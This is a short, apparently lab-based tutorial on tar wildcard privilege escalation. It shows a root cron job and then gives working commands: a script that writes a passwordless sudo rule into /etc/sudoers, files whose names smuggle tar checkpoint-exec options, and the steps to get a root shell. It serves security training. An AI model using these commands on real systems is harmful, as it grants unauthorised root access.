# Wildcard Abuse (tar Privilege Escalation)

## Overview
Wildcard characters are expanded by the shell **before** a command executes. If a privileged process (e.g., cron running as root) uses wildcards, an attacker may inject command-line options by creating specially named files.

## Common Wildcards
| Wildcard | Meaning |
|----------|---------|
| `*` | Matches any number of characters |
| `?` | Matches a single character |
| `[ ]` | Matches one character from a set/range |
| `~` | User's home directory |
| `-` | Defines a range inside brackets |

## Vulnerable Scenario
A root cron job runs:

```bash
*/1 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

Because `*` expands to all filenames, attacker-controlled filenames beginning with `--` are interpreted as **tar options**.

## Useful tar Options
```bash
--checkpoint=1
--checkpoint-action=exec=<command>
```

- `--checkpoint=1` → Trigger after every record.
- `--checkpoint-action=exec=<command>` → Execute a system command.

## Exploitation
Create a script:

```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

Create malicious filenames:

```bash
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

When the cron job runs, `tar` interprets these filenames as options and executes `root.sh`.

## Verification

```bash
sudo -l
```

Expected result:

```text
(root) NOPASSWD: ALL
```

Then gain root:

```bash
sudo su
```

## Enumeration Tips
Look for cron jobs or scripts using `tar` with wildcards:

```bash
grep -R "tar .* \*" /etc/cron* 2>/dev/null
crontab -l
cat /etc/crontab
```

## Key Takeaway
- Wildcard expansion happens **before** command execution.
- If a privileged command uses `*`, attacker-controlled filenames can become **command-line options**.
- `tar --checkpoint-action` is a classic wildcard privilege escalation technique.
